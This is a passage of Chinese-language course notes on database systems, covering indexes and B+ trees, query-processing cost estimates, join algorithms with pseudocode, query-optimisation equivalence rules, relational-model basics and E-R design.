<li>Hash indices (散列索引):  search keys (index entries) are distributed uniformly across “buckets” using a “hash function”. </li>
</ul>
<p>衡量索引性能的指标：</p>
<ul>
<li>Access Type：能够有效支持的访问类型，包括找到具有特定属性值的记录，以及找到属性值落在每个特定范围内的记录。</li>
<li>Access time：使用索引找到特定数据的时间</li>
<li>Insertion time：插入一个新数据的时间</li>
<li>Deletion time：删除一个数据的时间</li>
<li>Space overhead (空间开销)：索引结构占用的额外的存储空间</li>
</ul>
<h3 id="顺序索引"><a class="header" href="#顺序索引">顺序索引</a></h3>
<p><strong>Primary index(clustering index)</strong>：如果关系是按照某个<strong>search key</strong>排列的（有序），那么这个search key对应的index就是primary index。search-key通常是<strong>primary key</strong>，但没必要。（注意这里的三个单词）</p>
<p><strong>Secondary index(nonclustering index)</strong>： index对应的search-key和文件中记录的物理顺序没啥关系，也就是说无序。因为是无序的，所以即使对于两个相同的项目我们也需要两个指针指向他（比如80000）不像primary key记录第一个顺序往下扫描就好。故对于不是primary key的search key我们需要在中间加上一层指针。secondary index对于<strong>顺序扫描不友好</strong>，还不如直接扫描。</p>
<p><img src="Basic/Database/../images/image-20210506114940369.png" alt="image-20210506114940369" /></p>
<p><strong>Dense index</strong>稠密索引：稠密索引中，真正数据文件的每一个search-key都会有对应的index entry。比如这个例子中的search key就不是primary key。</p>
<p><img src="Basic/Database/../images/image-20210506114513678.png" alt="image-20210506114513678" /></p>
<p><strong>Sparse index</strong>稀疏索引：只有当关系按照search-key顺序排列才能使用（换句话说，一定是primary index）。比如下面的例子可以看出。这个稀疏的index是怎么确定的？往往是让index指向某个Block的起始位置。相比于稠密索引，稀疏索引占用的空间更小，更新的代价更小（不是每次都需要更新），不过查找的速度更慢。索引的更新很容易想清楚。</p>
<p><img src="Basic/Database/../images/image-20210506114501239.png" alt="image-20210506114501239" /></p>
<p><strong>Multilevel index</strong>当你的数据库过大的时候，你的索引文件可能也会太大，这个时候你就需要“索引的索引”。有几个注意的地方，一个是外层的索引项肯定是稀疏的（不然多级有个锤子用？），所以内层索引项肯定是有序的（不然外层怎么稀疏）。</p>
<p><img src="Basic/Database/../images/image-20210506160158185.png" alt="image-20210506160158185" /></p>
<h3 id="b-treestar"><a class="header" href="#b-treestar">B+ Tree:star:</a></h3>
<p>B+树构建一个矮树，减少Block IO。关于B+ Tree本身，在数据结构中已经学习了。</p>
<p>B+ Tree有点像一个多级索引。non-leaf node是稀疏索引。因为leaf node是有序的。</p>
<p>leaf node指向记录（如果记录重复就是一个记录的“桶”）。leaf node可以是稠密也可以是稀疏，条件和上面的索引是一样的。像下图的leaf 指向 name 是secondary index，所以必须是稠密的。</p>
<p><img src="Basic/Database/../images/image-20210513101650905.png" alt="image-20210513101650905" /></p>
<p>我们要知道删除/查询/插入的过程。</p>
<p>如果用B+ Tree组织文件的话，也可以在leaf node存放数据的内容。</p>
<h4 id="查询"><a class="header" href="#查询">查询</a></h4>
<p>Start with the root node
Examine the node for the smallest search-key value &gt; k (在节点中找比k大的最小键值, 即遇到第一个比K大的键值) </p>
<p>If such a value exists, assume it is Vi.  Then follow Pi to the child node (沿左指针指向子节点)
Otherwise k  Vm–1, where there are m pointers in the node.  Then follow Pm to the child node.
If the node reached by following the pointer above is not a leaf node, repeat the above procedure on the node, and follow the corresponding pointer. (继续往下找)
Eventually reach a leaf node.  If for some i, key Vi = k  follow pointer Pi  to the desired record or bucket.  Else no record with search-key value k exists.</p>
<h4 id="插入"><a class="header" href="#插入">插入</a></h4>
<p>下面的这个B+ Tree，n=4，每一层有3个值和4个指针。</p>
<p>这里面的插入是比较简单的。就是如果满了然后就分裂。对于叶子节点的分裂就是对半分就好了，需要注意的是非叶节点的分裂。然后还有逐级向上分裂。</p>
<p><img src="Basic/Database/../images/image-20210626151016259.png" alt="image-20210626151016259" /></p>
<h4 id="删除"><a class="header" href="#删除">删除</a></h4>
<p>如果不够半满了，就和兄弟合并/从兄弟拆分。</p>
<p><img src="Basic/Database/../images/image-20210626151016258.png" alt="image-20210626151016259" /></p>
<h3 id="sql-中的索引"><a class="header" href="#sql-中的索引">SQL 中的索引</a></h3>
<p>create index</p>
<p>drop index</p>
<hr />
<h2 id="query-processing"><a class="header" href="#query-processing">Query Processing</a></h2>
<p>关系代数比SQL表达式更好的能被系统分析。执行</p>
<p><img src="Basic/Database/../images/image-20210506100011441.png" alt="image-20210506100011441" /></p>
<p>有很多因素影响time cost. time cost = disk accesses + CPU + network communication.通常，disk access是占用时间最长的。所以我们主要考虑它。 我们用<strong>传递磁盘块数</strong>和<strong>搜索磁盘次数</strong>来度量查询计算计划的代价。假设磁盘子系统传输一个块的数据平均消耗$t_r$秒，磁盘块平均访问时间为$t_s$秒，那么一次传输b个块和执行S次磁盘搜索的操作将消耗$b<em>t_r+S</em>t_s$秒。这是忽略了很多细节的估算。一次block access指的是一次block transfer+一次block seek。</p>
<h3 id="选择运算"><a class="header" href="#选择运算">选择运算</a></h3>
<ul>
<li>A1 线性搜索。系统扫描每一个block对所有的记录进行测试，是否满足选择条件。这是<strong>通用的操作</strong>。无论筛选条件是什么都好用。
<ul>
<li>开销$t_s+b_r*t_r$，表示一次初始搜索加上文件大小$b_r$个blcok传输。</li>
<li>如果是只查找一条记录的等值比较，那么是平均开销$t_s+b_r/2*t_r$，$b_r/2$表示期望。</li>
</ul>
</li>
<li>A2 B+ tree primary index &amp; key属性等值比较。开销$(h_i+1)*(t_r+t_s)$，$h_i$表示树的高度，索引到之后在去取所以+1，因为是Key所以只有一条记录。</li>
<li>A3 B+ tree primary index &amp; 非key属性等值比较。开销$h_i*(t_r+t_s)+b*t_r$。因为是非Key所以假设有数据有$b$个块，因为是Primary index所以是连续的。</li>
<li>A4 B+ tree secondary index &amp; key属性等值比较。开销$(h_i+1)*(t_r+t_s)$。</li>
<li>A4 B+ tree secondary index &amp; 非key属性等值比较。开销$(h_i+n)*(t_r+t_s)$。因为是非Key所以假设有$n$条记录，因为不是Primary index所以不是连续的。代价可能很高。</li>
<li>A5 B+ tree primary index &amp; 比较。因为有序，所以和A3一样。这里的比较指的是<strong>简单比较</strong>，比如大于小于。</li>
<li>A6 B+ tree secondary index &amp; 比较。因为无序，所以和A4的第二种情况一样。</li>
<li>A7 利用一个索引的合取选择。$\sigma _{x_1 \bigwedge x_2 \bigwedge ... \bigwedge x_3}(r)$。如果条件中有简单比较，那么可以用上面的A2-A6先筛选一遍，然后再进行筛选。</li>
<li>A8 利用组合索引的合取选择。某些组合选择可以利用<strong>组合索引</strong>（多个属性上建立的索引）。转换成A2A3A4。</li>
<li>A9 通过标识符的交实现合取选择。通过筛选每一个条件，分别得到一个筛选结果的集合（注意，这里集合的内容是指向真正数据的指针，没有进行真正的读取）。然后我们把得到的集合排序做交集，让同在一个Block的数据读一次即可。</li>
</ul>
<p>实际上我们的B+树因为访问频繁，所以root往往是在Memory中的，non-leaf往往也在memory中。这里也没有考虑缓存。</p>
<h3 id="排序"><a class="header" href="#排序">排序</a></h3>
<p>Order by会让我们对结果进行排序，并且通过排序我们的某些操作可以更高校的进行，比如连接。</p>
<p>由于数据规模可能比整个内存都大，所以我们要使用external sort，比如归并排序。下面我们假设内存能容纳M个block。</p>
<ol>
<li>建立runs，就是每一个排好序的段，每个段M个大小。比如这个时候有N个runs。</li>
<li>接下来选取M-1个runs，进行merge。每一次按序选出第一个元组写入磁盘然后从内存中移除，然后再从磁盘中读入。这里之所以是M-1是为了留下一个存放结果的块。通过这一次merge，我们还有N/(M-1)个runs。重复第二步直到只有1个runs。</li>
</ol>
<p>代价分析，假设一共有$b_r$个Block：<!-- 可能有问题 --></p>
<ol>
<li>第一步，进行$2*b_r$传输，一半读一半写。</li>
<li>第二步，考虑归并次数为$log_{M-1}(b_r/M)$，一样的也要进行$2$次，除了最后一次不写回。一共$b_r*(2log_{M-1}(b_r/M)-1)$传输。再考虑磁盘搜索，$2(b_r /M)+(b_r /b_b)(2(log_{M−1}(b_r /M)) − 1)$。</li>
</ol>
<h3 id="join"><a class="header" href="#join">Join</a></h3>
<p>下面我们假设要做的运算是$r \Join_{check} s$。r和s在磁盘中都是连续的。关于他们代价的估计，其实非常的复杂，关键是要理解模型。</p>
<h4 id="nested-loop-join"><a class="header" href="#nested-loop-join">Nested-Loop Join</a></h4>
<p>这是最naive的做法</p>
<pre><code class="language-python">for tuple_r in block_r:
    for tuple_s in block_s:
        if (Check(tuple_r,tuple_s)):
            add (tuple_r,tuple_s) to result
</code></pre>
<h4 id="block-nested-loop-join-star"><a class="header" href="#block-nested-loop-join-star">Block Nested-Loop Join :star:</a></h4>
<p>在内存不够大的情况下，为了减小IO开销，以block为单位进行处理。</p>
<pre><code class="language-python"># Relation r is called the outer relation 
# Relation s is called the inner relation
for block_r in r:
	for block_s in s:
		for tuple_r in block_r:
			for tuple_s in block_s:
				if (Check(tuple_r,tuple_s)):
                    add (tuple_r,tuple_s) to result
</code></pre>
<p>最坏情况，也就是内存只能容纳三个Block（两个输入一个输出）要进行$transfer = block_r*block_s+block_r$，我们也可以看出要让r越小越好。对outer relation的每一块进行一次磁盘搜索，inner relation每一次循环进行一次磁盘搜索，$seek=2b_r$。</p>
<p>如果是对key进行join，那么我们找到一个便可以停止循环。 如果是LRU，可以从头扫到尾，再从尾扫到头，对buffer友好。</p>
<h4 id="indexed-nested-loop-join"><a class="header" href="#indexed-nested-loop-join">Indexed Nested-Loop Join</a></h4>
<p>只支持equal-join or natural join, 并且index in inner join atrribute。</p>
<p>In a nested-loop join , if an index is available on the inner loop’s join attribute, index lookups can replace file scans. For each tuple tr in the <strong>outer relation r</strong>, the index is used to look up tuples in sthat will satisfy the join condition with tuple tr。我们一般认为B+ Tree是半满的。</p>
<pre><code class="language-python">for tuple_r in r:
	tuple_s = FindByIndex(tuple_r)
    add (tuple_r,tuple_s) to result
</code></pre>
<p>如何估计代价呢？如果每次FindByIndex都需要从磁盘中读取B+ Tree Node的话，代价是<code>BTreeHeight+1</code>(假设叶子节点的指针直接指向磁盘中的内容)。读tuple_r的话，肯定不能一次读一个，要尽可能的多读，怎么说也要一次读一个Block。</p>
<p>最坏情况假设Memory还是只能容纳三个Block（两个输入一个输出），那外层循环读r需要$b_r$，内层索引查找需要$n_r\times(height+1)$。对seek和transfer都是这样。所以有时候会统称为$access = b_r+n_r\times(height+1)$ </p>
<h4 id="merge-join"><a class="header" href="#merge-join">Merge Join</a></h4>
<p>每个Block只用读一次，但是要求他们是按照equal-join的条件排好序的。过程和归并排序中的merge类似。这个的代价不怎么好估计，但是不高。最多是$b_r+b_s$次access。</p>
<p>如果无序的话就要先排序。</p>
<h4 id="hash-join"><a class="header" href="#hash-join">Hash Join</a></h4>
<p>同样也是只能用在equal-join 或natural-join上。</p>
<p>基本思想是，把join Attribute建立hash。那么若tuple_r散列到了i，对应的tuple_s也必然散列到了i。所以只用在相同的散列块中寻找就可以了。</p>
<p><img src="Basic/Database/../images/image-20210520105140903.png" alt="image-20210520105140903" /></p>
<pre><code class="language-pascal">/* Partition s */
for each tuple ts in s do 
begin
	i := hash(ts[JoinAttrs]);
	Hs[i] := Hs[i] ∪ {ts};
end
/* Partition r */
for each tuple tr in r do
begin
	i := hash(tr[JoinAttrs]);
	Hr[i] := Hr[i] ∪ {tr};
end

/* Perform join on each partition */
for i := 0 to nh do 
begin
	read Hs[i] and build an in-memory hash index on it;
	for each tuple tr in Hr[i] do 
		for each tuple ts in Hsi do 
			if (ts[JoinAttrs] = tr[JoinAttrs])
				add tr ✶ ts to the result;
end
</code></pre>
<h3 id="expressions"><a class="header" href="#expressions">Expressions</a></h3>
<p>Materialized：每一步计算的结果被materialize，然后用于下一步的运算。这种办法总是可用的。比如下面这个例子，选择完了产生一个中间relation，然后在和Instructor连接产生结果。</p>
<p>Pipeline：每一次操作的结果直接传递到下一步操作。这种办法效率更高，但是不一定可用。比如下面这个例子，department和Instructor做连接并判断是不是Watson。</p>
<p><img src="Basic/Database/../images/image-20210520111806629.png" alt="image-20210520111806629" /></p>
<h2 id="query-optimal"><a class="header" href="#query-optimal">Query Optimal</a></h2>
<ol>
<li>两个关系代数表达式是等价的，但是执行效率可能是不同的</li>
<li>对于同一个表达式，我们有不同的执行方式</li>
</ol>
<h3 id="等价表达式"><a class="header" href="#等价表达式">等价表达式</a></h3>
<p>有过滤能力的往前推，尽早进行投影。让连接结果较小的连接先进行。</p>
<ol>
<li>
<p>Conjunctive selection operations can be deconstructed into a sequence of individual selections. This transformation is referred to as a cascade of $\sigma$.	这样就只用一次了</p>
<p>$\sigma_{\theta_1}(\sigma_{\theta_2 }(E)) = \sigma_{\theta_1 \wedge \theta_2 }(E)$</p>
</li>
<li>
<p>Selection operations are <strong>commutative(可交换的)</strong>.</p>
<p>$\sigma_{\theta_1}(\sigma_{\theta_2 }(E)) = \sigma_{\theta_2}(\sigma_{\theta_1 }(E))$</p>
</li>
<li>
<p>Only the final operations in a sequence of projection operations are needed; the others can be omitted. This transformation can also be referred to as a cascade of $\prod $</p>
<p>$\prod_{L1} (\prod_{L2} (... (\prod_{Ln} (E))...)) = \prod_{L1}(E)$</p>
</li>
<li>
<p>Selections can be combined with Cartesian products and theta joins.</p>
<p>$\sigma_{\theta_1} (E1 \Join_{\theta_2} E2) = E1 \Join_{\sigma_1∧\sigma_2} E2$</p>
</li>
<li>
<p>Theta-join operations are commutative. 上面提到的不同Join算法对Join的顺序有不同要求</p>
<p>$a \Join b=b\Join a$</p>
</li>
<li>
<p>Natural-join operations are associative. 我们应该让预期结果更小的Join先执行</p>
<p>$a \Join (b \Join c)=(a \Join b) \Join c$</p>
</li>
<li>
<p>The selection operation distributes over the theta-join operation under the following two conditions</p>
<p><img src="Basic/Database/../images/image-20210520135510985.png" alt="image-20210520135510985" /></p>
<p><img src="Basic/Database/../images/image-20210520135519323.png" alt="image-20210520135519323" /></p>
</li>
<li>
<p>The projection operation distributes over the theta-join operation under the following conditions</p>
<p><img src="Basic/Database/../images/image-20210520135454231.png" alt="image-20210520135454231" /></p>
</li>
<li>
<p>The set operations union and intersection are commutative. </p>
<p>$a\cup b = b\cup a$</p>
</li>
<li>
<p>Set union and intersection are associative.</p>
<p>$(a\cup b)\cup c = a\cup (b \cup c)$</p>
</li>
<li>
<p>The selection operation distributes(分配率) over the union, intersection, and set difference operations.我们应该把这些筛选的条件先执行。</p>
<p>$\sigma_P(E_1-E_2)=\sigma_P(E_1)-\sigma(E_2)$</p>
</li>
<li>
<p>The projection operation distributes over the union operation.我们应该把这些筛选的条件先执行。</p>
<p>$\prod_{L}(E_1\cup E_2) = \prod_{L}(E_1) \cup \prod_L(E_2)$</p>
</li>
</ol>
<h3 id="基于统计信息的代价估计"><a class="header" href="#基于统计信息的代价估计">基于统计信息的代价估计</a></h3>
<ul>
<li>$n_r$, the number of tuples in the relation r.</li>
<li>$b_r$, the number of blocks containing tuples of relation r.</li>
<li>$l_r$, the size of a tuple of relation r in bytes.</li>
<li>$f_r$, the blocking factor of relation r — that is, the number of tuples of relation r that fit into one block.</li>
<li>$V(A,r)$, the number of <strong>distinct</strong> values that appear in the relation r for attribute A. This value is the same as the size of A(r). If A is a key for relationr, $V(A,r)$ is $n_r$.</li>
<li>每个属性不同值（范围）的直方图</li>
</ul>
<p>统计值不一定要非常正确，因为维护统计值也需要开销。</p>
<p>然后我们对不同的运算估计结果的大小。</p>
<ol>
<li>单条件等值合取。如果有直方图就用比例×$n_r$，如果没有就用$n_r/V(A,r)$。如果是<strong>多条件合取/析取</strong>我们可以认为条件之间是相互独立的，然后用概率论的知识估计。如果是<strong>范围选择运算</strong>，我们可能会假设结果在最大值和最小值之间均匀分布；如果连最大值和最小值都没有，就是n/2。</li>
<li>natural Join。如果两个表没有同名字段，我们认为natural join就是笛卡尔积；如果对应的两个表有主键和对应的外键，比如学生（有专业字段）表和专业表，那么join的结果就是学生条数；如果是两个随便的字段，那么我们认为是$min(\frac {n_r<em>n_s} {V(A,r)}, \frac {n_r</em>n_s} {V(A,s)})$，注意这个推导的前提依然是属性均匀分布。</li>
<li>投影。$V(A,r)$，V就是这个概念。</li>
<li>聚集。也是$V(A,r)$，A是指group by的那个属性。</li>
<li>集合运算。R并S 当作 $n_r+n_s$，R交S 当作 $min(n_r,n_s)$，R-S 当作 $n_r$。这些都是上界。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-导论"><a class="header" href="#database-导论">Database-导论</a></h1>
<h2 id="导论-introduction"><a class="header" href="#导论-introduction">导论 Introduction</a></h2>
<p>什么是数据库DB？</p>
<ul>
<li>a large collection of <strong>integrated and persistent</strong> data.</li>
<li>长期存储在计算机内部，有组织的，可共享的数据集合。</li>
</ul>
<p>什么是数据库管理系统DBMS？
DBMS=Database + a set of programs used to access, update and manage database.</p>
<p>数据库管理系统的特性：</p>
<ul>
<li>数据访问的<strong>高效Efficiency</strong>和<strong>可扩展性scalability</strong></li>
<li>缩短应用开发时间</li>
<li>数据<strong>独立性independence</strong>（物理数据独立性 / 逻辑数据独立性）</li>
<li>数据<strong>完整性integrity</strong>和安全性</li>
<li><strong>并发Concurrent</strong>访问和鲁棒性（恢复）</li>
</ul>
<h3 id="view-of-data"><a class="header" href="#view-of-data">View of data</a></h3>
<p>我们用下面的抽象层次结构来管理数据：</p>
<ul>
<li>Physical level：最底层，关注数据是怎么样真实的存储的。</li>
<li>Logical level：关注数据是怎么在数据库中存储的，DBA管理的。</li>
<li>View level：是logical level存储的数据的一部分，提取出来方便使用。
<img src="Basic/Database/../images/1614835991393.png" alt="" /></li>
</ul>
<p>Schemas and instances，就像类和实例一样，前者是后者的模板。
<img src="Basic/Database/../images/1614836802907.jpg" alt="" />
Logical schemas是最重要的。在关系型数据库中他就是一张表。
Physical schemas是描述底层设计的。</p>
<p>数据模型帮助我们设计数据库：</p>
<ul>
<li>Entitu-Relationship Model :star: ：</li>
<li>Relational Model</li>
<li>Object-Based Data model</li>
</ul>
<h3 id="数据库设计"><a class="header" href="#数据库设计">数据库设计</a></h3>
<ol>
<li>需求分析
– 需要什么样的数据、应用程序和业务</li>
<li>概念数据库设计
– 使用 E-R 模型或类似的高层次数据模型，描述数据</li>
<li>逻辑数据库设计
– 将概念设计转换为某个DBMS所支持的数据模型</li>
<li>结构优化
– 关系标准化，检查冗余和相关的异常关系结构</li>
<li>物理数据库设计
– 索引，集群和数据库调优</li>
<li>创建并初始化数据库&amp;安全设计
– 加载初始数据，测试
– 识别不同的用户及他们的角色</li>
</ol>
<h3 id="database-language"><a class="header" href="#database-language">Database Language</a></h3>
<ul>
<li>DDL=Data Definition Language</li>
<li>DML=Data Manipulation Language</li>
<li>DCL=Data Control Language</li>
</ul>
<p>我们学习的重点是SQL。</p>
<h3 id="database用户"><a class="header" href="#database用户">Database用户</a></h3>
<p>DBA：Database Administrator。拥有最高权限，有下面5个功能：</p>
<ul>
<li><strong>Schema definition</strong>. The DBA creates the original database schema by executing a set of data definition statements in the DDL.</li>
<li><strong>Storage structure and access-method definition.</strong></li>
<li><strong>Schema and physical-organization modification</strong>：The DBA carries out changes to the schema and physical organization to reflect the changing needs of the organization, or to alter the physical organization to improve performance</li>
<li><strong>Granting of authorization for data access.</strong> By granting different types of authorization, the database administrator can regulate which parts of the database various users can access. The authorization information is kept in a special system structure that the database system consults whenever someone attempts to access the data in the system</li>
<li>**Routine maintenance.**日常维护</li>
</ul>
<h3 id="transaction-management"><a class="header" href="#transaction-management">Transaction Management</a></h3>
<p>我们需要让事务具有如下特性：</p>
<ul>
<li>atomicity 原子性：一个事务要么发生，要么不发生</li>
<li>consistence 一致性</li>
<li>isolation 隔离性</li>
<li>durability 持久性：一旦执行成功就会永久保存</li>
</ul>
<h3 id="dbms结构"><a class="header" href="#dbms结构">DBMS结构</a></h3>
<p><img src="Basic/Database/../images/1614829205175.png" alt="" /></p>
<ol>
<li>Storage manager：</li>
<li>Query processor：</li>
</ol>
<h2 id="二关系模型-relational-model"><a class="header" href="#二关系模型-relational-model">二、关系模型 Relational Model</a></h2>
<h3 id="relation-1"><a class="header" href="#relation-1">Relation：</a></h3>
<ul>
<li>A <strong>relational database</strong> is a collection of one or more <strong>relations</strong>, which are based on <strong>relational model</strong>. 关系型数据库是使用最广泛的数据库。</li>
<li>A <strong>relation</strong> is a table with rows and columns. 简单的理解Relation就是一张表。</li>
<li>The set of allowed values for each <strong>attribute</strong> is called the <strong>domain</strong> (域) of the attribute. 简单的理解Attribute就是列，对应的数据取值范围就是Domain。</li>
<li><strong>tuple</strong>代表的就是数据库中的一行。</li>
</ul>
<h3 id="schema--instance"><a class="header" href="#schema--instance">Schema &amp; instance：</a></h3>
<ul>
<li>The <strong>relation schema</strong> describe the structure of the relation. 比如<code>Instructor-schema = (ID: string, name: string, dept_name: string, salary: int) </code>，介绍了表头以及域（类型）。规定了表的结构。
<ul>
<li>我们用R表示schema. <code>R={ID, name, dept_name, salary}</code></li>
</ul>
</li>
<li>The relation <strong>instance</strong> corresponds to the snapshot of the data in the relation at a given instant in time. 
<ul>
<li>我们用r(R)表示某个instance。是一张具体的表。他和schema的关系，就跟class和instance一样。</li>
</ul>
</li>
</ul>
<h3 id="key"><a class="header" href="#key">Key：</a></h3>
<ul>
<li>K is a <strong>superkey</strong> (超码) of R if values for K are sufficient to identify a unique tuple of each possible relation r(R) 。或者说K是可以唯一确定某条记录的，一个或多个属性的集合，
<ul>
<li>K is a <strong>candidate key</strong> (候选码) if K is minimal superkey. 如果K的任意一个真子集都不是superkey,那么K就是candidate key。这也是我们通常关心的。</li>
<li>K is a <strong>primary key</strong> (主码), if k is a candidate key and been defined by user explicitly. Primary key is usually marked by underline. <strong>Primary key</strong>是被数据库设计者专门选出的candidate key。我们通常用下划线表示它。</li>
</ul>
</li>
<li>如果一个relation r1中包含另一个relation r2的primary key<u>KK</u>。那么在r1中，我们把KK称为<strong>foreign key</strong>。把r1称为refering relation(参照关系)，把r2称为referenced relation (被参照关系).
<ul>
<li>参照关系中外键的值必须<strong>在被参照关系中实际存在或为null</strong>。定义外键的好处是防止r(A,B,C)中的B出现无效数据，这种约束称为referential integrity constraint。</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-数据库设计"><a class="header" href="#database-数据库设计">Database-数据库设计</a></h1>
<ol>
<li>
<p>Requirement analysis
What data, applications, and operations needed</p>
</li>
<li>
<p><strong>Conceptual database design</strong></p>
<p>A high-level description of data, constraints using <strong>E - R model</strong> or a similar high level data model</p>
</li>
<li>
<p><strong>Logical database design</strong></p>
<p>Convert the conceptual design into a DB schema <strong>Relation Schema</strong></p>
</li>
<li>
<p>Schema refinement</p>
<p>Normalization of relations: Check relational schema for redundancies and related anomalies.</p>
</li>
<li>
<p>Physical database design:</p>
<p>Indexing, clustering and database tuning</p>
</li>
<li>
<p>Create/initialize the database &amp; Security design</p>
<p>Load initial data, testing. Identify different user groups and their roles</p>
</li>
</ol>
<h2 id="一conceptual-database-design--e-r-model"><a class="header" href="#一conceptual-database-design--e-r-model">一、Conceptual database design &amp; E-R model</a></h2>
<h3 id="概念"><a class="header" href="#概念">概念</a></h3>
<p><strong>Entity</strong>：实体是客观存在的对象并且与其他对象可区分，实体具有属性。</p>
<p><strong>Entity set</strong>：实体集是相同类型的实体的集合，他们具有相同的性质。</p>
<p><strong>Relationship</strong>：联系是指多个实体之间的相互关联，联系也可以有属性。</p>
<p><strong>Relationship set</strong>：联系集是相同类型联系的集合。一个联系集包含多个同类联系（或联系实例，relationship instance），一个联系集表示二个或多个实体集之间的关联。用数学的语言描述联系集就是$R\in {(e_1,e_2,...e_n)|e_1 \in E_1,e_2 \in E_2,...e_n\in E_n}$，具体的$(e_1,e_2,...e_n)$就是relationship。</p>
<p><strong>Attribute</strong> 属性</p>
<ul>
<li>每一个属性都有可取值的集合，称为<strong>domain</strong>。</li>
<li>简单属性和复合属性。比如名字可以包括姓+名两个属性，就称为复合属性。如果有些时候我们单独的需要提取人的姓，那么把属性拆分成复合属性是一个好的选择。</li>
<li>单值属性和多值属性。一个人的身份证号只有一个，但是一个人可以拥有很多电话号码，所以身份证号是单值属性，电话号码是多值属性。</li>
<li>派生属性，比如，生日派生出年龄。</li>
<li>relationship也可以有属性</li>
</ul>
<p>我们说entity set$E_1,E_2$<strong>参与</strong>relationship set$R$。</p>
<p>举一个例子。这里有$E_1=instructor, E_2=student$，他们参与了关系$R=takes$。关系R是联系集，也可以有属性，比如下面的date。只有两个实体的关系（或者说**$degree=2$**）的relationship我们称之为binary relationship，这也是大多数的情况。</p>
<p><img src="Basic/Database/../images/image-20210401125108768.png" alt="image-20210401125108768" /></p>
<h3 id="约束"><a class="header" href="#约束">约束</a></h3>
<p>ER图是可以反应约束条件的，比如主码，外码等。</p>
<p><strong>mapping cardinality</strong>映射基数，表示一个entity通过一个relationship能关联的entity的数量。对于一个binary relationship，有下面几种情况：</p>
<ul>
<li>1-1：可以通过任意一个entity来作为relationship set的primary key。</li>
<li>1-N(N-1)：可以选择N作为relationship set的primary key。</li>
<li>N-N：需要用tuple作为relationship set的primary key。</li>
</ul>
<p>对于entity set的primary key，我们要求他的attribute一定要可以唯一的表示每一个entity。</p>
<p><strong>参与约束</strong>：如果entity set $E$ 中的每一个entity都参与到了relationship set $R$ 中，那么我们称 $E$ 在  $R$ 中是<strong>total</strong>。如果只有部分那么称为<strong>partial</strong>。</p>
<h3 id="构建e-r图"><a class="header" href="#构建e-r图">构建E-R图</a></h3>
<p>E-R是一个非常好的对现实世界建模的方式，可以很好的应对很多不同的现实情况。</p>
<p><img src="Basic/Database/../images/image-20210401111839425.png" alt="image-20210401111839425" /></p>
<p>关系集</p>
<p><img src="Basic/Database/../images/image-20210401111900345.png" alt="image-20210401111900345" /></p>
<p>ER图也可以很好的表示非二元关系。</p>
<p><img src="Basic/Database/../images/image-20210403145727770.png" alt="image-20210403145727770" /></p>
<p>这是带了<strong>描述性属性</strong>的<strong>relationship</strong> advisor, data表示instructor和students匹配的时间。</p>
<p><img src="Basic/Database/../images/image-20210403145914375.png" alt="image-20210403145914375" /></p>
<p>被relationship set连接的两个两个entity set不一定是要不一样的，如果是一样的话，我们可能需要表明他们在关系中扮演的角色<strong>role</strong>。比如下面这个例子，course和course之间的联系，一个课程是另一个课程的预修要求。</p>
<p><img src="Basic/Database/../images/image-20210618160152192.png" alt="image-20210618160152192" /></p>
<p><strong>弱实体集</strong>是指没有primary key的entity set。比如这个开课情况关系，要唯一确定section本来应该需要<code>{course_id,sec_id,semester,year}</code>，但是如果section中包含course_id那么就出现了冗余。一个办法是删除sec_course，把section和course的关系隐含到一个属性中，但这不是我们需要的。</p>
<p>所以我们选择删除section中的<code>course_id</code>属性，但是这样section就没有足够的属性标识一个指定的section了（没有primary key了）为此我们将sec_course视为一个特殊的联系，他为唯一表示section实体提供额外信息，即<code>course_id</code>。</p>
<p>那么相应的有primary key的entity set就是强实体集。他们之间的relationship set就叫做identifying relationship，是多对一的，并且weak entity set的参与是全部的。identifying relationship不应该有描述性属性，因为都可以放在弱实体集中。</p>
<p>弱实体集没有主码，但是我们仍然要区分依赖于特定强实体集中某entity的弱实体集中的entity。这就通过分辨符<strong>discriminator</strong>(比如下面的sec_id,semester,year)。</p>
<p><img src="Basic/Database/../images/image-20210618161827474.png" alt="image-20210618161827474" /></p>
<h3 id="从er图到逻辑表"><a class="header" href="#从er图到逻辑表">从ER图到逻辑表</a></h3>
<ul>
<li>
<p>对于一般的<strong>强 Entity Set</strong> ，我们可以对他直接创建一张表。</p>
<ul>
<li>简单属性没什么好说的；对于复合的属性，把他每一个子属性都作为属性放进去。</li>
<li>对于<strong>多值型的属性</strong>，需要为它再建立一张表。他的primary key由属性的所有者和属性共同完成，并且把属性的所有者作为forgien key。</li>
<li>对于派生属性，我们并不在直接表中反映出来。</li>
</ul>
</li>
<li>
<p>对于<strong>relationship</strong>，要把双方的primary key和自己的属性都带过来。</p>
<ul>
<li>不过对于relationship自己的primary key，取决于是1-1/1-N/N-N。如果是N-N的话我们需要tuple作为primary key，1-N取N就可以了，1-1任取一个。如果不是Binary relationship，</li>
</ul>
</li>
<li>
<p>对于<strong>弱 Entity set</strong>，因为仅仅依靠自己的属性无法确定primary key，所以还需要包括他所依赖的强 Entity set的属性（往往是primary key），并将他作为foreign key。</p>
<ul>
<li>我们往往还需要做级联删除的约束。</li>
</ul>
</li>
</ul>
<p>按照上面的模式创建的表会存在冗余，我们可以合并冗余：</p>
<ol>
<li>
<p>弱实体集需要包含强实体集的primary key，所以他们之间的relationship这张表就没有存在的意义。</p>
</li>
<li>
<p>1-N可以merge。考虑这样一个例子，学生$E_1=student$，学院$E_2=department$。$E_1$对$E_2$是一个<strong>多对一</strong>的关系，并且在这个关系中$E_1$是total的。那么我们可以把department作为$E_1=student$的一个属性，同时作为foreign key。
即使$E_1$是partial的，我们仍然可以通过NULL来完成。</p>
</li>
<li>
<p>1-1就更可以merge了。而且可以把relationship合并到任意一个entity set中。</p>
</li>
</ol>
<h3 id="进阶er图"><a class="header" href="#进阶er图">进阶ER图</a></h3>
<h4 id="specialize--generalize"><a class="header" href="#specialize--generalize">specialize &amp; generalize</a></h4>
<p>感觉有点像基类和子类的关系。比如<code>person</code>可能可以specialize为<code>student</code>和<code>employ</code>，<code>students</code>可能有<code>GPA</code>等属性，<code>employ</code>可能有<code>salary</code>属性，这是基类没有的。这就是specialize的过程，反过来看，就是generalize的过程。主要的目的，就是<strong>属性继承</strong>。</p>
<ul>
<li>total generalization/specialization: 每个高层entity必须属于一个底层entity set.	(比如人分成男女)</li>
<li>partial generalization/specialization: 某些高层entity可以不属于任何一个低层entity set (比如职业统计，但是可能有人无业？)</li>
<li>disjoint: 每个entity最多属于一个低层entity set</li>
